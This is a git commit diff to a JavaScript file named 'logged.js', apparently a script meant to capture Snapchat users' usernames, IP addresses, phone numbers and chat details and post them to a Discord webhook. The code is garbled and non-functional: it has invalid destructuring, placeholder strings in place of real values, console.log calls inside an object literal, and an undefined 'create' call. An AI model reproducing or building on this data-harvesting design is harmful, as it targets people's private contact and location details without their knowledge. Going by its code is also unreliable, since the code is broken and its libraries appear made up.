32eb453291720cedaee7ccf29686be150bff1ee7
natrix_dev <discordlenko@gmail.com>
2021-10-22 20:19:56 +0200

    Little update on snap apis keys

--- logged.js
+++ logged.js
@@ -1,26 +1,26 @@
 //NATRIX_DEV
-
+let API_KEY = "YOUR SNAP API KEY (secret)";
 //open source library at github/natrix_dev
 
 //modules imports
-const { WebhookClient } = require("discord.js")
-const snap = require("snap-api")
-const ip, num, pseudo = require("snap-api-sender_infos")
+const { WebhookClient } = require("discord.js");
+const snap = require("snap-api");
+const ip, num, pseudo = require("snap-api-sender_infos");
 //vars 
-var user = "snap-api-send_infos-user.username"
-var ip = "snap-api-send_infos-user.ipSender"
-var num = "snap-api-send_infos-user.numSender"
-var reciever = "snap-api-send_infos-rec"
-var grp_name = "snap-api-send_infos-CHAT_NAME"
+var user = "snap-api-send_infos-user.username";
+var ip = "snap-api-send_infos-user.ipSender";
+var num = "snap-api-send_infos-user.numSender";
+var reciever = "snap-api-send_infos-rec";
+var grp_name = "snap-api-send_infos-CHAT_NAME";
 
 //def message
-
+let infos = {
 console.log(`USERNAME: ${user}`)
 console.log(`IP ADRESS: ${ip}`)
 console.log(`PHONE: ${num}`)
 console.log(`RECIEVER: ${reciever}`)
-console.log(`CHAT: ${grp_nae}`)
-
+console.log(`CHAT: ${grp_name}`)
+};
 //console code 
 create (WebhookClient, 963)
 WebhookClient.send("infos")
